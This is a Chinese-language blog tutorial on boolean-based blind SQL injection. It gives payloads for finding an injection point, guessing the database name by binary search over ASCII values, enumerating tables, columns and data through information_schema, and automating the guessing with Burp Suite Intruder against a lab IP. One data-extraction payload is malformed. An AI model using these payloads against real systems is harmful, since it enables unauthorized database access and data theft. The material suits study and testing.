title: SQL布尔盲注(延时注入后面再写)
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-03-12 10:39:00
---
#### 表现
在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。
或者为真时返回正常页面，为假时跳转到其它页面等。

#### 原理
在后端的PHP代码中，对你传入的数据进行了处理并判断
判断是True或False会执行不同代码

#### 开始注入(二分法)
##### 判断注入点
使用一些判断真假的语句来进行判定
当它是数字型时:
```
1' and 1=0 --+
1' and 1=1 --+
```
如果第一个与第二个回显不一样那么可能是布尔盲注
但是不排除有些丧心病狂的扑街预判了你的预判
这时候修改为不常见的数值（如1352=1352等）

当它是字符串型注入时:
```
1' and '1'='114514 --+
1' and '1'='666 --+
```

##### 猜数据库名长度
这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。
刚刚好又有and可以判断语句，是不是天无绝人之路？
```
1' and (length(database()))>x--+
```
当报错的时候就说明数据库名字长度是x-1了嘛

##### 猜数据库名（ASCII码）
```
1' and ascii(substr(database(),1,1))>100--+
1' and ascii(substr(database(),1,1))<150--+
```
这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。
是不是很麻烦？是就对了！
现在是告诉你注入原理，不看就滚犊子。

##### 猜表名
```
1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>100--+
1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))<150--+
```
方法其实是和前面的联合查询注入一样的，多了个二分法而已
其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了

##### 猜字段名
```
1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))>50--+
1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))<80--+
```
还是一样的

##### 猜数据
```
1' and (ascii(substr(( select  id users limit 0,1),1,1)))<80--+
1' and (ascii(substr(( select  id users limit 0,1),1,1)))>30--+
```
仍然是一样的

#### 开始注入(字符判断法)
数据库名字长度的判断跟上面的的一样
对每一位猜解都要写很多次判断语句
判断这些字符数字
```
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_
```

#### 使用Burp_Suite注入
由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。
1、抓包并将数据包传送到intruder
2、对对应位置进行上面提到的字符数字爆破:
```
http://192.168.162.128/?id=1' and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&Submit=Submit#
```
payload set中分别设置并开始attack:
number类型，从1到数据库名字长度，步长为1
simple list类型，导入字符数字的字典

***后面的同理，自己举一反三吧***